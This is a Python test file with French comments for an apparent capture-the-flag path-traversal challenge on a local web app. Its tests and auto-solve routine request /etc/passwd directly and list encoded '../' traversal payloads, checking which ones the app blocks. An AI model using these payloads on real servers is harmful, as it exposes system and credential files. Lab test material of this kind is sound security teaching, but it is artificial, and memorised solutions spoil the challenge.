import pytest
import requests
import urllib.parse
import os
import tempfile

class TestPathTraversal:
    """Tests pour la vulnérabilité de path traversal"""
    
    @pytest.fixture
    def base_url(self):
        """URL de base de l'application"""
        return "http://localhost:3206"
    
    @pytest.fixture
    def session(self):
        """Session HTTP réutilisable"""
        return requests.Session()
    
    def test_normal_file_access(self, base_url, session):
        """Test d'accès normal à un fichier"""
        response = session.get(f"{base_url}/view?file=document.txt")
        assert response.status_code == 200
        assert "Ceci est un document confidentiel" in response.text
    
    def test_path_traversal_blocked(self, base_url, session):
        """Test que le path traversal basique est bloqué"""
        response = session.get(f"{base_url}/view?file=../etc/passwd")
        assert response.status_code == 404
    
    def test_direct_etc_passwd_access(self, base_url, session):
        """Test d'accès direct à /etc/passwd"""
        response = session.get(f"{base_url}/view?file=/etc/passwd")
        
        # L'accès direct devrait être autorisé
        assert response.status_code == 200
        assert "root:" in response.text
    
    def test_path_traversal_url_encoded_blocked(self, base_url, session):
        """Test que le path traversal avec encodage URL est bloqué"""
        # Utiliser le payload qui ne devrait plus fonctionner
        encoded_path = "%252e%252e%252f%252e%252e%252fetc/passwd"
        response = session.get(f"{base_url}/view?file={encoded_path}")
        
        # La vulnérabilité devrait être bloquée
        assert response.status_code == 404
    
    def test_double_encoding_blocked(self, base_url, session):
        """Test que le double encodage URL est bloqué"""
        # Double encodage qui ne devrait plus fonctionner
        double_encoded = "%252e%252e%252f%252e%252e%252fetc/passwd"
        response = session.get(f"{base_url}/view?file={double_encoded}")
        
        # Devrait être bloqué
        assert response.status_code == 404
    
    def test_flag_file_access(self, base_url, session):
        """Test d'accès au fichier flag"""
        response = session.get(f"{base_url}/view?file=flag.txt")
        
        assert response.status_code == 200
        assert "FLAG{" in response.text
    
    def test_download_direct_etc_passwd(self, base_url, session):
        """Test de téléchargement direct de /etc/passwd"""
        response = session.get(f"{base_url}/download?file=/etc/passwd")
        
        assert response.status_code == 200
        assert "root:" in response.text
    
    def test_download_path_traversal_blocked(self, base_url, session):
        """Test que le téléchargement avec path traversal est bloqué"""
        encoded_path = "%252e%252e%252f%252e%252e%252fetc/passwd"
        response = session.get(f"{base_url}/download?file={encoded_path}")
        
        assert response.status_code == 404

def test_auto_solve():
    """Fonction d'auto-solve pour valider l'exploit"""
    base_url = "http://localhost:3206"
    session = requests.Session()
    
    # Test d'accès direct à /etc/passwd
    try:
        response = session.get(f"{base_url}/view?file=/etc/passwd", timeout=5)
        if response.status_code == 200 and "root:" in response.text:
            print("Exploit réussi avec l'accès direct: /etc/passwd")
            return True
    except Exception as e:
        print(f"Erreur avec l'accès direct: {e}")
    
    # Test que les path traversal sont bloqués
    payloads = [
        "%252e%252e%252f%252e%252e%252fetc/passwd",  # Double encodage
        "%2e%2e%2f%2e%2e%2fetc/passwd",              # Encodage simple
        "..%2f..%2fetc/passwd"                       # Encodage mixte
    ]
    
    for payload in payloads:
        try:
            response = session.get(f"{base_url}/view?file={payload}", timeout=5)
            if response.status_code == 404:
                print(f"Path traversal bloqué correctement: {payload}")
            else:
                print(f"ERREUR: Path traversal non bloqué: {payload}")
                return False
        except Exception as e:
            print(f"Erreur avec le payload {payload}: {e}")
    
    return True
